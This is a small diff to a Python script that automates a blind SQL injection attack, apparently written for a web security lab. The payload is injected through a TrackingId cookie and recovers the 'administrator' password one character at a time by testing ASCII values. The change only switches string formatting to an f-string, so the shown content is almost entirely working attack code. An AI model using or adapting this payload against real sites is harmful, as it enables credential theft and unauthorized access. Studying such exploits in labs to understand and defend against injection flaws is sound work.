@@ -17,7 +17,7 @@ def main():
    pword = ""
    for i in range(1,21):
        for j in range(32,126):
-        payload ="' and (SELECT ascii(substring(password,%s,1)) from users where username = 'administrator')='%s'--"%(i,j)
+        payload =f"' and (SELECT ascii(substring(password,{i},1)) from users where username = 'administrator')='{j}'--"
         payload_encoded = urllib.parse.quote(payload)
         cookies = {'TrackingId': TrackingId + payload_encoded, 'session': session}
        # r=requests.get(url, cookies=cookies, verify=False, proxies=proxies)
